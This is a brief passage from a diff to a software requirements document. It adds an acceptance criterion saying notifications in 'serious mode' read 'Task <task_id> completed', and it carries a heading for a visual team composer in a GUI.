+- AC-22.6.2: Notifications use standard language in serious mode
+  - verify: In serious mode, receive a task completion notification -> message reads "Task <task_id> completed"
 
 ### REQ-04.24 (extended): Visual Team Composer in GUI
 
